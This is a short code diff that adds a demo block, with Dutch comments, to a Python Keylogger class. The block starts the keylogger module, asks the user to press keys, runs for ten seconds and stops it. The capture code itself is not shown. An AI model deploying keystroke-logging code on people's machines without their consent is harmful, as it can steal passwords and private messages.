@@ -43,3 +43,16 @@ class Keylogger:
         """Logs errors to a dedicated error file."""
         with open("error_log.txt", "a") as error_file:
             error_file.write(f"{datetime.now()}: {message}\n")
+
+security_tool = Keylogger()
+# Voorbeeld van de Keylogger module
+print("Starting keylogger (run for 10 seconds)...")
+security_tool.keylogger_module.start()
+
+print("Keylogger is running... Press keys to test it.")
+
+# Run de keylogger voor 10 seconden voor testdoeleinden
+time.sleep(10)
+
+# Stop de keylogger en beëindig het programma
+security_tool.keylogger_module.stop()
